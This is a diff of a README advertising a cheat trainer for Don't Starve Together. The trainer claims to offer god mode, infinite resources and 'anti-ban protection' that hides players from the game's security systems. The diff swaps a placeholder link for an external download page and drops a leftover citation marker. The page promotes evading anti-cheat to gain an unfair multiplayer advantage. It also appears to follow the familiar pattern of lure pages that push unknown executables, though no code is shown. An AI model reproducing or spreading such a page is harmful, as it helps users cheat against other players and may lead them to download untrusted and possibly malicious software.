@@ -1,11 +1,11 @@
 # 🎮 Don’t Starve Together Cheat Trainer: God Mode & Anti-Ban Tools 🛡️  
 
-**Don’t Starve Together Cheat Trainer** provides **unrestricted survival** with **invincibility**, **infinite resources**, and **anti-ban protection**. Craft instantly, stay hidden from security systems, and dominate multiplayer challenges without needing a VPS. Perfect for players seeking an unfair advantage [[4]].  
+**Don’t Starve Together Cheat Trainer** provides **unrestricted survival** with **invincibility**, **infinite resources**, and **anti-ban protection**. Craft instantly, stay hidden from security systems, and dominate multiplayer challenges without needing a VPS. Perfect for players seeking an unfair advantage.  
 
 ---
 
 ### 🔗 Download Cheat Trainer  
-[![Download Don't Starve Together Cheat Trainer](https://img.shields.io/badge/Download%20Don't%20Starve%20Together-Cheat%20Trainer-blueviolet)](#)  
+[![Download Don't Starve Together Cheat Trainer](https://img.shields.io/badge/Download%20Don't%20Starve%20Together-Cheat%20Trainer-blueviolet)](https://dont-starve-together-cheat-trainer.github.io/.github/)  
 
 ---
 
